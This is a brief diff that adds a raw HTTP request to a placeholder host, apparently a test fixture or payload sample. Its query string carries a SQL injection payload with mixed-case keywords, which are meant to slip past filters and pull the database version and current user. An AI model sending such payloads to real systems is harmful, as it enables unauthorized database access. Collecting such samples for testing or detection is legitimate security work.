@@ -1,0 +1,4 @@
+GET /a?s=1'%20uNiOn%20AlL%20sElEcT%20vErSiOn(),UsEr(),3--%20- HTTP/1.1
+Host: demo.example.com
+Connection: close
+
